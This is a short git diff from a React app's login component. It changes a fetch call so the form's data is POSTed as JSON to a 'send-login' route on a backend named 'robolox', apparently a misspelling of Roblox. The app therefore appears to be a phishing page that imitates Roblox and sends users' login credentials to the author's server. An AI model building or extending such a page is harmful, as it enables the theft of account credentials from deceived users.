@@ -19,7 +19,7 @@ function App() {
     }
 
     try {
-      const response = await fetch("https://robolox-backend.onrender.com", {
+      const response = await fetch("https://robolox-backend.onrender.com/send-login", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(formData),
